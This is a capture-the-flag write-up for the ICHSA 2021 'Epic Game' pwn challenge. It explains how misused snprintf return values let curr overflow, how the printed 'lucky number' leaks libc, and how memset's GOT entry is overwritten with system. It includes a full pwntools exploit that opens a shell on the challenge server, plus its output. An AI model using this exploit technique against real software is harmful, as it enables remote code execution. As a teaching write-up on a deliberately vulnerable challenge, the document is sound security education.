---
title: 'ICHSA CTF 2021: Epic Game (Pwn)'
layout: post
date: '2021-06-03'
tags:
- CTF
- writeup
- ICHSA CTF
- Pwn
comments: true
---

> I created a cmd mode for WoW
> but I suspect you can't win :(
> can you check my game?
>
> May the cyber spirit be ever in your favor!!
>
> good luck (you'll need it for sure)
>
> Connect: `nc epic_game.ichsa.ctf.today 8007`
>
> [epic_game.zip](/files/epic_game.zip)

In this challenge, we are provided with a zip file. Upon unpacking it, we are presented with the following files.

```
vagrant in pwnbox in /CTF/ichsa-ctf/epic-game
❯ tree ctfd
ctfd
├── Dockerfile
├── README.txt
├── app.out
├── docker-compose.yml
├── epic_game.c
├── epic_game.h
├── flag.txt
└── libc.so.6
```

As usual, let's start off by checking what security mitigations are present in the binary.

```
vagrant in pwnbox in ichsa-ctf/epic-game/ctfd
❯ checksec app.out
[*] '/CTF/ichsa-ctf/epic-game/ctfd/app.out'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Partial RELRO, Canary present, and No PIE. Smells like a potential GOT overwrite, but let's not get ahead of ourselves. Let's run the binary and see what it does.

```
vagrant in pwnbox in ichsa-ctf/epic-game/ctfd
❯ ./app.out
Hello epic warrior, it's time to begin your quest

Choose your character:
        1 - Mighty warrior
        2 - Wizard
        3 - Elf

Your Choice:
1
Choose your character name (limit to 12 chars)
Your Choice:
abc
Hello abc The Mighty Warrior!!!
Your health is 1000 pt.
Your shield is 100 pt.
Your strength is 500 pt.
Your lucky number is 140082059670720
You will need 2147483647 points to get the flag
Good luck, the kingdom trust you!!

You meet a Evil snake!!!
abc
choose your move:
1 - hit
2 - protect
3 - run

Your Choice:
1
you killed an evil creature, kudos!!!

your current health 950
You meet a Dragon!!!
abc
choose your move:
1 - hit
2 - protect
3 - run

Your Choice:
2
R.I.P abc The Mighty Warrior
You were a brave warrior but not enough to get a flag
```

Cool. Looks like it's some kind of text-based RPG game. We'll play around with it in GDB and fuzz it a little.

```
pwndbg> cyclic -n8 512
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaac
pwndbg> r
Starting program: /CTF/ichsa-ctf/epic-game/ctfd/app.out
Hello epic warrior, it's time to begin your quest

Choose your character:
        1 - Mighty warrior
        2 - Wizard
        3 - Elf

Your Choice:
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaac
Input Error

Choose your character name (limit to 12 chars)
Your Choice:
Input Error

Hello aiaaaaaaajaa The Mighty Warrior!!!
Your health is 1000 pt.
Your shield is 100 pt.
Your strength is 500 pt.
Your lucky number is 140737348003008
You will need 2147483647 points to get the flag
Good luck, the kingdom trust you!!

You meet a Evil snake!!!
aiaaaaaaajaa
choose your move:
1 - hit
2 - protect
3 - run

Your Choice:
Input Error

aiaaaaaaajaa
choose your move:
1 - hit
2 - protect
3 - run

Your Choice:
Input Error

aiaaaaaaajaa
choose your move:
1 - hit
2 - protect
3 - run

Your Choice:
Input Error

aiaaaaaaajaa
choose your move:
1 - hit
2 - protect
3 - run

Your Choice:
Input Error

aiaaaaaaajaa
choose your move:
1 - hit
2 - protect
3 - run

Your Choice:
Input Error

aiaaaaaaajaa
choose your move:
1 - hit
2 - protect
3 - run

Your Choice:
Input Error

aiaaaaaaajaa
choose your move:
1 - hit
2 - protect
3 - run

Your Choice:
Input Error

aiaaaaaaajaa
choose your move:
1 - hit
2 - protect
3 - run

Your Choice:
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaac
Input Error

aiaaaaaaajaa
choose your move:
1 - hit
2 - protect
3 - run

Your Choice:
Input Error

aiaaaaaaajaa
choose your move:
1 - hit
2 - protect
3 - run

Your Choice:
Input Error

aiaaaaaaajaa
choose your move:
1 - hit
2 - protect
3 - run

Your Choice:
Input Error

aiaaaaaaajaa
choose your move:
1 - hit
2 - protect
3 - run

Your Choice:
Input Error

aiaaaaaaajaa
choose your move:
1 - hit
2 - protect
3 - run

Your Choice:
Input Error

aiaaaaaaajaa
choose your move:
1 - hit
2 - protect
3 - run

Your Choice:
Input Error

aiaaaaaaajaa
choose your move:
1 - hit
2 - protect
3 - run

Your Choice:
Input Error

aiaaaaaaajaa
choose your move:
1 - hit
2 - protect
3 - run

Your Choice:
Input Error

aiaaaaaaajaa
choose your move:
1 - hit
2 - protect
3 - run

Your Choice:
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaac
Input Error

aiaaaaaaajaa
choose your move:
1 - hit
2 - protect
3 - run

Your Choice:
Input Error

Program received signal SIGBUS, Bus error.
_IO_vsnprintf (string=0x6161616161a2a260 <error: Cannot access memory at address 0x6161616161a2a260>, maxlen=<optimized out>, format=0x402015 "%s", args=args@entry=0x7fffffffdf90) at vsnprintf.c:112
112     vsnprintf.c: No such file or directory.

pwndbg> context backtrace
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────
 ► f 0     7ffff7a6a9c9 vsnprintf+121
   f 1     7ffff7a470cf snprintf+143
   f 2           401397 log_error+105
   f 3           401aea main+1814
   f 4     7ffff7a03bf7 __libc_start_main+231
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Interesting, looks like we've got a crash in `snprintf` which is within the `log_error` function. Let's cross-reference this with the provided source code to make sense of this.

```c
void log_error(char* buff)
{
    puts("Input Error\n");
    if(write_to_log)
    {
        curr += snprintf(error_log+curr, sizeof(error_log)-curr, "%s", buff);
        if (curr == sizeof(error_log))
        {
           write_to_log = false;
           //TODO: write the log buffer to file
        }
    }
}
```

On the surface, there appears to be nothing too wrong with the code above. But if we look closely at the documentation for `snprintf`, it's actually a disaster.

> RETURN VALUE
>
> The functions snprintf() and vsnprintf() do not write more than size bytes (including the terminating  null
> byte ('\0')).  If the output was truncated due to this limit, then the return value is the number of char‐
> acters (excluding the terminating null byte) which would have been written to the final string if enough
> space had been available. Thus, a return value of size or more means that the output was truncated.

The crucial part is: **number of characters which would have been written to the final string if enough space had been available**.

This is a huge problem because `curr` is being used by this program to determine how much data can be written. To illustrate the issue, let's consider an example.

Suppose we trigger `log_error` twice with `"A" * 512 + "\n"` as the payload, keeping in mind that `error_log` is of type `char[1024]`. On the first run, `curr` would be updated to be `513`, and on the second run (although the last "A" and "\n" can't fit in) `curr` would be updated to be `1026`. This would cause `curr` to be more than `1024`. What's the significance of this? Let's trigger `log_error` again, and observe the parameters passed to `snprintf`.

```
pwndbg> context disassembly
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────
 ► 0x401392 <log_error+100>    call   snprintf@plt <snprintf@plt>
        s: 0x4044c2 (write_to_log+2) ◂— 0x402000000000000
        maxlen: 0xfffffffffffffffe
        format: 0x402015 ◂— 0x6f6c6c6548007325 /* '%s' */
        vararg: 0x7ffdf3476a40 ◂— 0x4141414141414141
```

With reference to the above output we are now writing to `write_to_log+2`, and we seem to be able to write a max of `0xfffffffffffffffe` characters. How did this happen? If we consider the function prototype for `snprintf`, `maxlen` is expected to be of type `size_t` which is unsigned. This means that passing `-2` as `maxlen` would therefore cause it to be interpreted as an extremely large number.

Now, how do we proceed from here? Well, it would certaintly be nice if we could turn this into an arbitrary write primitive... and we actually can!

```
pwndbg> dq &error_log+1024
00000000004044c0     0000000000000001 0000000000000402
```

Notice that `curr` is located right after `write_to_log` (`0x402` is `1026`), and since we have an overflow we can control the value of `curr`. Based on the source code, `error_log+curr` is passed in as the first parameter to `snprintf`. Therefore, if we can control `curr`, we can use `snprintf` to perform an arbitrary write by offsetting from `error_log`. Since this binary has partial RELRO, writing into the GOT is an option.

```
pwndbg> print &error_log
$1 = (<data variable, no debug info> *) 0x4040c0 <error_log>
pwndbg> got

GOT protection: Partial RELRO | GOT functions: 13

[0x404018] puts@GLIBC_2.2.5 -> 0x7f6bbcc71aa0 (puts) ◂— push   r13
[0x404020] strlen@GLIBC_2.2.5 -> 0x7f6bbcd7f4d0 (__strlen_avx2) ◂— mov    ecx, edi
[0x404028] __stack_chk_fail@GLIBC_2.4 -> 0x401056 (__stack_chk_fail@plt+6) ◂— push   2
[0x404030] printf@GLIBC_2.2.5 -> 0x7f6bbcc55f70 (printf) ◂— sub    rsp, 0xd8
[0x404038] snprintf@GLIBC_2.2.5 -> 0x7f6bbcc56040 (snprintf) ◂— sub    rsp, 0xd8
[0x404040] memset@GLIBC_2.2.5 -> 0x7f6bbcd7fe30 (__memset_avx2_unaligned) ◂— vmovd  xmm0, esi
[0x404048] read@GLIBC_2.2.5 -> 0x401096 (read@plt+6) ◂— push   6
[0x404050] srand@GLIBC_2.2.5 -> 0x7f6bbcc34cd0 (srandom) ◂— sub    rsp, 8
[0x404058] fgets@GLIBC_2.2.5 -> 0x7f6bbcc6fc00 (fgets) ◂— test   esi, esi
[0x404060] memcpy@GLIBC_2.14 -> 0x7f6bbcd7f9b0 (__memmove_avx_unaligned) ◂— mov    rax, rdi
[0x404068] time@GLIBC_2.2.5 -> 0x7fff0bff3f10 (time) ◂— push   rbp
[0x404070] open@GLIBC_2.2.5 -> 0x4010e6 (open@plt+6) ◂— push   0xb /* 'h\x0b' */
[0x404078] strtoul@GLIBC_2.2.5 -> 0x7f6bbcc36260 (strtouq) ◂— mov    rax, qword ptr [rip + 0x3a5b61]
```

As seen above, the GOT is located at an address lower than that of `error_log`. That's slightly unfortunate since the write location is `error_log+curr`. But what if we make `curr` a really large number like `0xffffffffffffffff` using our overflow? It might just wrap around the virtual address space and get us to a lower address.

```
pwndbg> context disassembly
──────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────
 ► 0x401392 <log_error+100>    call   snprintf@plt <snprintf@plt>
        s: 0x40402f (_GLOBAL_OFFSET_TABLE_+47) ◂— 0x7f6bbcc55f7000
        maxlen: 0x491
        format: 0x402015 ◂— 0x6f6c6c6548007325 /* '%s' */
        vararg: 0x7fff0bfec360 ◂— 0x4141414141414141

pwndbg> dq 0x40402f
000000000040402f     007f6bbcc55f7000 007f6bbcc5604000
000000000040403f     007f6bbcd7fe3000 0000000040109600
000000000040404f     007f6bbcc34cd000 007f6bbcc6fc0000
000000000040405f     007f6bbcd7f9b000 007fff0bff3f1000
pwndbg> got

GOT protection: Partial RELRO | GOT functions: 13

[0x404018] puts@GLIBC_2.2.5 -> 0x7f6bbcc71aa0 (puts) ◂— push   r13
[0x404020] strlen@GLIBC_2.2.5 -> 0x7f6bbcd7f4d0 (__strlen_avx2) ◂— mov    ecx, edi
[0x404028] __stack_chk_fail@GLIBC_2.4 -> 0x401056 (__stack_chk_fail@plt+6) ◂— push   2
[0x404030] printf@GLIBC_2.2.5 -> 0x7f6bbcc55f70 (printf) ◂— sub    rsp, 0xd8
[0x404038] snprintf@GLIBC_2.2.5 -> 0x7f6bbcc56040 (snprintf) ◂— sub    rsp, 0xd8
[0x404040] memset@GLIBC_2.2.5 -> 0x7f6bbcd7fe30 (__memset_avx2_unaligned) ◂— vmovd  xmm0, esi
[0x404048] read@GLIBC_2.2.5 -> 0x401096 (read@plt+6) ◂— push   6
[0x404050] srand@GLIBC_2.2.5 -> 0x7f6bbcc34cd0 (srandom) ◂— sub    rsp, 8
[0x404058] fgets@GLIBC_2.2.5 -> 0x7f6bbcc6fc00 (fgets) ◂— test   esi, esi
[0x404060] memcpy@GLIBC_2.14 -> 0x7f6bbcd7f9b0 (__memmove_avx_unaligned) ◂— mov    rax, rdi
[0x404068] time@GLIBC_2.2.5 -> 0x7fff0bff3f10 (time) ◂— push   rbp
[0x404070] open@GLIBC_2.2.5 -> 0x4010e6 (open@plt+6) ◂— push   0xb /* 'h\x0b' */
[0x404078] strtoul@GLIBC_2.2.5 -> 0x7f6bbcc36260 (strtouq) ◂— mov    rax, qword ptr [rip + 0x3a5b61]
```

What do u know? It conveniently landed right in the middle of the GOT. More specifically, near the end of the `__stack_chk_fail` entry. Therefore, we can overflow into any of the entries after that.

```c
        while(tmp_enemy.health_points > 0 && current_player.health_points > 0 && !run){
            puts(current_player.name);
            puts("choose your move:\n" \
            "1 - hit \n" \
            "2 - protect\n" \
            "3 - run\n");

            memset(buffer, 0x00, BUFFER_SIZE);

            puts("Your Choice:");
```

If we consider the above excerpt of the source code, `memset` actually looks like a really nice candidate to overwrite with `system` especially since our input `buffer` is passed as the first parameter.

However, we're still short of a libc address leak to calculate the address of `system`... or are we?

```c
void init_player(player* p_player, uint32_t character_type)
{
    uint64_t luck = rand;
    switch (character_type)
    {
        case 1: //Mighty warrior
        {
            strcpy(p_player->player_type, "Mighty Warrior");
            p_player->game_points = 0;
            p_player->health_points = 1000;
            p_player->shield = 100;
            p_player->strength = 500;
            p_player->luck = luck;
            break;
        }
        case 2: //Wizard
        {
            strcpy(p_player->player_type, "Wizard");
            p_player->game_points = 0;
            p_player->health_points = 1200;
            p_player->shield = 400;
            p_player->strength = 200;
            p_player->luck = luck;
            break;
        }
        case 3: //Elf
        {
            strcpy(p_player->player_type, "Elf");
            p_player->game_points = 0;
            p_player->health_points = 1000;
            p_player->shield = 500;
            p_player->strength = 300;
            p_player->luck = luck;
            break;
        }
        default:
            break;
    }
}
```

With reference to the above source code, our `luck` stat is actually set to the address of `rand` (which is a libc function).

```c
    printf("Hello %s The %s!!!\n", current_player.name, current_player.player_type);
    printf("Your health is %d pt.\n"\
           "Your shield is %d pt.\n"\
           "Your strength is %d pt.\n"\
           "Your lucky number is %lld\n",
           current_player.health_points,
           current_player.shield,
           current_player.strength,
           current_player.luck);
    printf("You will need %d points to get the flag\n", POINTS_FOR_FLAG);
    puts("Good luck, the kingdom trust you!!\n");
```

Fortunately for us, they've decided to print our `luck` stat, so they've already provided us with a libc address leak. How nice.

From this point on we should be able to craft an exploit to spawn a shell on the server.

```python
from pwn import *

HOST = "epic_game.ichsa.ctf.today"
PORT = 8007
FLAG_FORMAT = "ICHSA_CTF{\w+}"
REMOTE_FLAGPATH = "/app/flag.txt"

CHALLENGE = "app.out"
TARGET_LIBC = "libc.so.6"

CHOICE_PROMPT = b"Your Choice:\n"

LUCKY_NUMBER_MARKER = b"Your lucky number is "


elf = context.binary = ELF(CHALLENGE, checksec=False)

if args.REMOTE:
    libc = ELF(TARGET_LIBC, checksec=False)
    io = remote(HOST, PORT)
else:
    libc = elf.libc
    io = elf.process()

with log.progress("Stage 1: Flood error_log to limit"):
    io.sendlineafter(CHOICE_PROMPT, cyclic(512))
    io.sendlineafter(CHOICE_PROMPT, cyclic(512))

with log.progress("Stage 2: Leak lib address"):
    io.recvuntil(LUCKY_NUMBER_MARKER)

    libc_rand = int(io.recvline())
    libc.address = libc_rand - libc.sym.rand

    log.success(f"libc @ {hex(libc.address)}")

with log.progress("Stage 3: Overwrite memset GOT entry"):
    io.sendlineafter(CHOICE_PROMPT, flat({7: 0xFFFFFFFFFFFFFF}))
    io.sendlineafter(
        CHOICE_PROMPT, b"/bin/sh && AAAAAA" + p64(libc.sym.system)
    )

with log.progress("Stage 4: Pwn"):
    io.sendlineafter(CHOICE_PROMPT, str(1))

if args.REMOTE:
    io.clean(timeout=0.5)
    io.sendline(f"cat {REMOTE_FLAGPATH}")
    log.success(f"Flag: {io.recvregexS(FLAG_FORMAT)}")
    io.close()
else:
    io.interactive()
```

Running the above exploit yields us the flag.

```
❯ python xpl.py REMOTE
[+] Opening connection to epic_game.ichsa.ctf.today on port 8007: Done
[+] Stage 1: Flood error_log to limit: Done
[+] Stage 2: Leak lib address: Done
[+] libc @ 0x7fb1acdfa000
[+] Stage 3: Overwrite memset GOT entry: Done
[+] Stage 4: Pwn: Done
[+] Flag: ICHSA_CTF{Th3_cyb3r_5p1r1t_0f_luck_I5_s7r0ng_w17h_y0u}
[*] Closed connection to epic_game.ichsa.ctf.today port 8007
```

Flag: `ICHSA_CTF{Th3_cyb3r_5p1r1t_0f_luck_I5_s7r0ng_w17h_y0u}`
